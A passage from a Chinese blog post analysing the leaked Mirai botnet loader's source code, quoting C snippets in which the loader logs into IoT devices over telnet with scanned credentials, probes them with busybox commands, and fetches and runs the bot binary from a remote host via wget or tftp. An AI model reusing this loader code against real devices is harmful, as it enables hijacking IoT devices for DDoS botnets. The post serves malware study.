<p>Loader中存放了针对各个平台编译后的可执行文件，其功能是用于加载Mirai的bot程序。在启动之初就会判断这个文件夹是否存在，然后启用了一个epoll架构的简单服务器，一旦有新的连接就启动一个新的worker线程。</p>
<p>在worker线程中，维护了一个状态机，即列出了几种状态，然后在状态之间转换。大概是为了应付一些随时要求验证的需求。</p>
<p>首先woker线程使用scanner提供的IP地址和账户密码信息登录IOT设备：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TELNET_USER_PROMPT:</span><br><span class="line">    consumed = connection_consume_login_prompt(conn);</span><br><span class="line">    <span class="keyword">if</span> (consumed)</span><br><span class="line">    &#123;</span><br><span class="line">        util_sockprintf(conn-&gt;fd, <span class="string">&quot;%s&quot;</span>, conn-&gt;info.user);</span><br><span class="line">        <span class="built_in">strcpy</span>(conn-&gt;output_buffer.data, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        conn-&gt;output_buffer.deadline = time(<span class="literal">NULL</span>) + <span class="number">1</span>;</span><br><span class="line">        conn-&gt;state_telnet = TELNET_PASS_PROMPT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TELNET_PASS_PROMPT:</span><br><span class="line">    consumed = connection_consume_password_prompt(conn);</span><br><span class="line">    <span class="keyword">if</span> (consumed)</span><br><span class="line">    &#123;</span><br><span class="line">        util_sockprintf(conn-&gt;fd, <span class="string">&quot;%s&quot;</span>, conn-&gt;info.pass);</span><br><span class="line">        <span class="built_in">strcpy</span>(conn-&gt;output_buffer.data, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        conn-&gt;output_buffer.deadline = time(<span class="literal">NULL</span>) + <span class="number">1</span>;</span><br><span class="line">        conn-&gt;state_telnet = TELNET_WAITPASS_PROMPT; <span class="comment">// At the very least it will print SOMETHING</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>首先会执行<code>/bin/busybox  ps</code>和<code>/bin/busybox cat  /proc/mounts</code>命令查看设备挂载的分区。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">                    <span class="keyword">case</span> TELNET_VERIFY_LOGIN:</span><br><span class="line">                        consumed = connection_consume_verify_login(conn);</span><br><span class="line">                        <span class="keyword">if</span> (consumed)</span><br><span class="line">                        &#123;</span><br><span class="line">                            ATOMIC_INC(&amp;wrker-&gt;srv-&gt;total_logins);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">&quot;[FD%d] Succesfully logged in\n&quot;</span>, ev-&gt;data.fd);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                            util_sockprintf(conn-&gt;fd, <span class="string">&quot;/bin/busybox ps; &quot;</span> TOKEN_QUERY <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                            conn-&gt;state_telnet = TELNET_PARSE_PS;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> TELNET_PARSE_PS:</span><br><span class="line">                        <span class="keyword">if</span> ((consumed = connection_consume_psoutput(conn)) &gt; <span class="number">0</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            util_sockprintf(conn-&gt;fd, <span class="string">&quot;/bin/busybox cat /proc/mounts; &quot;</span> TOKEN_QUERY <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                            conn-&gt;state_telnet = TELNET_PARSE_MOUNTS;</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>

<p>然后进行创建文件、使用<code>chmod</code>命令调整文件权限至777，之后使用<code>cpuinfo</code>命令判断设备运行平台，再使用<code>wget</code>、<code>tftp</code>或<code>echo</code>三种方式将对应版本的恶意可执行文件上传至IOT设备。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">                            <span class="keyword">switch</span> (conn-&gt;info.upload_method)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">case</span> UPLOAD_ECHO:</span><br><span class="line">                                    conn-&gt;state_telnet = TELNET_UPLOAD_ECHO;</span><br><span class="line">                                    conn-&gt;timeout = <span class="number">30</span>;</span><br><span class="line">                                    util_sockprintf(conn-&gt;fd, <span class="string">&quot;/bin/busybox cp &quot;</span>FN_BINARY <span class="string">&quot; &quot;</span> FN_DROPPER <span class="string">&quot;; &gt; &quot;</span> FN_DROPPER <span class="string">&quot;; /bin/busybox chmod 777 &quot;</span> FN_DROPPER <span class="string">&quot;; &quot;</span> TOKEN_QUERY <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">                                    <span class="built_in">printf</span>(<span class="string">&quot;echo\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                <span class="keyword">case</span> UPLOAD_WGET:</span><br><span class="line">                                    conn-&gt;state_telnet = TELNET_UPLOAD_WGET;</span><br><span class="line">                                    conn-&gt;timeout = <span class="number">120</span>;</span><br><span class="line">                                    util_sockprintf(conn-&gt;fd, <span class="string">&quot;/bin/busybox wget http://%s:%d/bins/%s.%s -O - &gt; &quot;</span>FN_BINARY <span class="string">&quot;; /bin/busybox chmod 777 &quot;</span> FN_BINARY <span class="string">&quot;; &quot;</span> TOKEN_QUERY <span class="string">&quot;\r\n&quot;</span>,</span><br><span class="line">                                                    wrker-&gt;srv-&gt;wget_host_ip, wrker-&gt;srv-&gt;wget_host_port, <span class="string">&quot;mirai&quot;</span>, conn-&gt;info.arch);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">                                    <span class="built_in">printf</span>(<span class="string">&quot;wget\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                <span class="keyword">case</span> UPLOAD_TFTP:</span><br><span class="line">                                    conn-&gt;state_telnet = TELNET_UPLOAD_TFTP;</span><br><span class="line">                                    conn-&gt;timeout = <span class="number">120</span>;</span><br><span class="line">                                    util_sockprintf(conn-&gt;fd, <span class="string">&quot;/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 &quot;</span> FN_BINARY <span class="string">&quot;; &quot;</span> TOKEN_QUERY <span class="string">&quot;\r\n&quot;</span>,</span><br><span class="line">                                                    FN_BINARY, <span class="string">&quot;mirai&quot;</span>, conn-&gt;info.arch, wrker-&gt;srv-&gt;tftp_host_ip);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">                                    <span class="built_in">printf</span>(<span class="string">&quot;tftp\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br></pre></td></tr></table></figure>

<p>在完成装载之后，还会根据下载的类型，运行相应的程序，到了这里，整个loader的工作才是做完了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>花了蛮长时间，实际也是匆匆扫过。所以有些地方可以不甚仔细。</p>
<p>Mirai的程序，感觉与之前看的工业的代码似乎不完全一样，而且觉得有些地方仍有改进的余地。我感觉这是作者故意留了代码变异的空间，亦或者是根本没有完成。（代码中的DEBUG宏数量有点太多了。）</p>
<p>Mirai是瞄准IoT 设备的弱口令问题，因为很多人并不很在意物联网设备的安全问题，甚至会直接使用初始的用户名与密码，这样会造成物联网设备的大量沦陷。通过巨量的僵尸网络，恶意代码控制者可以进行DDos攻击以瘫痪网络服务器。</p>
<p>而随着物联网设备的应用拓宽，恐怕问题并不止于网络的DDos，更多的关于隐私或者其他的方面的问题会出现其中。我想这才是应该担忧的问题。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
<li><a href="https://paper.seebug.org/142/#21-payload">https://paper.seebug.org/142/#21-payload</a></li>
<li><a href="https://www.jianshu.com/p/9a460a3723f8">https://www.jianshu.com/p/9a460a3723f8</a></li>
<li><a href="http://blog.nsfocus.net/mirai-source-analysis-report/">http://blog.nsfocus.net/mirai-source-analysis-report/</a></li>
</ol>
</div><div class="tags"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Mirai/" rel="tag">Mirai</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/scanner/" rel="tag">scanner</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/source-code/" rel="tag">source code</a></li></ul></div><div class="post-nav"><a class="pre" href="/2018/11/05/Angular%E4%BD%BF%E7%94%A8Plotly%E8%AE%B0%E5%BD%95/">Angular使用Plotly记录</a><a class="next" href="/2018/09/28/Angular%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%E8%B1%86%E7%93%A3API/">Angular跨域访问豆瓣API</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://blog.ciaran.cn"/></form></div><div class="widget"><div class="author-info"><a class="info-avatar" href="/about/" title="关于"><img class="nofancybox" src="/img/avatar.png"/></a><p></p><a class="info-icon" href="mailto:ciaranchen@qq.com" title="Email" target="_blank" style="margin-inline:5px"> <i class="fa fa-envelope-square" style="margin-inline:5px"></i></a><a class="info-icon" href="https://github.com/ciaranchen" title="Github" target="_blank" style="margin-inline:5px"> <i class="fa fa-github-square" style="margin-inline:5px"></i></a><a class="info-icon" href="/atom.xml" title="RSS" target="_blank" style="margin-inline:5px"> <i class="fa fa-rss-square" style="margin-inline:5px"></i></a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/">人工智能</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E5%AE%83/">其它</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%90%8E%E7%AB%AF/">后端</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E6%9C%AF/">学术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%89%AF%E6%B7%A1/">扯淡</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E5%AD%A6/">数学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97/">科学计算</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/">编译原理</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Angular/" style="font-size: 15px;">Angular</a> <a href="/tags/typescript/" style="font-size: 15px;">typescript</a> <a href="/tags/Plotly/" style="font-size: 15px;">Plotly</a> <a href="/tags/Cygwin/" style="font-size: 15px;">Cygwin</a> <a href="/tags/CORS/" style="font-size: 15px;">CORS</a> <a href="/tags/Clojure/" style="font-size: 15px;">Clojure</a> <a href="/tags/LaTeX/" style="font-size: 15px;">LaTeX</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/CNN/" style="font-size: 15px;">CNN</a> <a href="/tags/OpenWrt/" style="font-size: 15px;">OpenWrt</a> <a href="/tags/OpenClash/" style="font-size: 15px;">OpenClash</a> <a href="/tags/Mirai/" style="font-size: 15px;">Mirai</a> <a href="/tags/scanner/" style="font-size: 15px;">scanner</a> <a href="/tags/source-code/" style="font-size: 15px;">source code</a> <a href="/tags/%E9%97%B2%E8%B0%88/" style="font-size: 15px;">闲谈</a> <a href="/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/" style="font-size: 15px;">大数据</a> <a href="/tags/bridge/" style="font-size: 15px;">bridge</a> <a href="/tags/NixOS/" style="font-size: 15px;">NixOS</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/lisp/" style="font-size: 15px;">lisp</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/git/" style="font-size: 15px;">git</a> <a href="/tags/ipython/" style="font-size: 15px;">ipython</a> <a href="/tags/jupyter/" style="font-size: 15px;">jupyter</a> <a href="/tags/Java/" style="font-size: 15px;">Java</a> <a href="/tags/C-C/" style="font-size: 15px;">C/C++</a> <a href="/tags/utools/" style="font-size: 15px;">utools</a> <a href="/tags/%E4%BB%A3%E6%95%B0/" style="font-size: 15px;">代数</a> <a href="/tags/hexo/" style="font-size: 15px;">hexo</a> <a href="/tags/%E7%BF%BB%E8%AF%91/" style="font-size: 15px;">翻译</a> <a href="/tags/Zotero/" style="font-size: 15px;">Zotero</a> <a href="/tags/javascript%EF%BC%8C-URLScheme/" style="font-size: 15px;">javascript， URLScheme</a> <a href="/tags/%E5%8F%A4%E6%96%87/" style="font-size: 15px;">古文</a> <a href="/tags/%E6%B0%B4/" style="font-size: 15px;">水</a> <a href="/tags/%E9%85%8D%E7%BD%AE/" style="font-size: 15px;">配置</a> <a href="/tags/assemble/" style="font-size: 15px;">assemble</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 15px;">算法</a> <a href="/tags/%E6%95%B0%E6%A8%A1/" style="font-size: 15px;">数模</a> <a href="/tags/sqlmap/" style="font-size: 15px;">sqlmap</a> <a href="/tags/OllyDbg/" style="font-size: 15px;">OllyDbg</a> <a href="/tags/%E6%95%B0%E5%80%BC%E8%AE%A1%E7%AE%97/" style="font-size: 15px;">数值计算</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/01/16/utools%E5%AD%A6%E6%9C%AF%E5%B0%8F%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/">utools学术小工具介绍</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/01/15/%E5%BF%AB%E9%80%9F%E5%A4%8D%E5%88%B6Zotero%E9%A1%B9%E7%9B%AE%E7%9A%84%E9%93%BE%E6%8E%A5/">快速复制Zotero项目的链接</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/24/OpenClash%E9%85%8D%E7%BD%AE/">OpenClash 配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/18/%E6%81%A2%E5%A4%8D%E6%9B%B4%E6%96%B0%E5%8D%9A%E5%AE%A2/">恢复更新博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/23/NixOS%E9%85%8D%E7%BD%AE%E7%BD%91%E6%A1%A5/">NixOS 配置网桥</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/28/%E5%AD%90%E4%B8%8D%E9%81%93%E7%88%B6%E4%B9%8B%E8%BF%87%E5%87%BA%E5%A4%84%E8%80%83/">子不道父之过出处考</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/13/%E7%AE%80%E5%8D%95sqlmap%E6%B3%A8%E5%85%A5/">简单sqlmap注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/13/%E7%AE%80%E5%8D%95%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">简单缓冲区溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/05/Angular%E4%BD%BF%E7%94%A8Plotly%E8%AE%B0%E5%BD%95/">Angular使用Plotly记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/09/Mirai%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/">Mirai源码阅读</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://de_licious.gitlab.io/physics_math_fun/" title="de_licious" target="_blank">de_licious</a><ul></ul><a href="http://www.saberismywife.com/" title="SaberDa" target="_blank">SaberDa</a><ul></ul><a href="http://www.stephenzhang.me/" title="StephenZhang" target="_blank">StephenZhang</a><ul></ul><a href="http://blog.boileryao.com/" title="Boiler Yao" target="_blank">Boiler Yao</a><ul></ul><a href="http://hilvcha.github.io/" title="Hilvcha" target="_blank">Hilvcha</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2024 <a href="/." rel="nofollow">Ciaran Chen 的博客.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho. </a><a rel="nofollow" target="_blank" href="http://www.miitbeian.gov.cn">陕ICP备17013427号</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/latest/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0"></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/latest/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js?v=1.0.0" successtext="复制成功！"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css?v=1.0.0"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>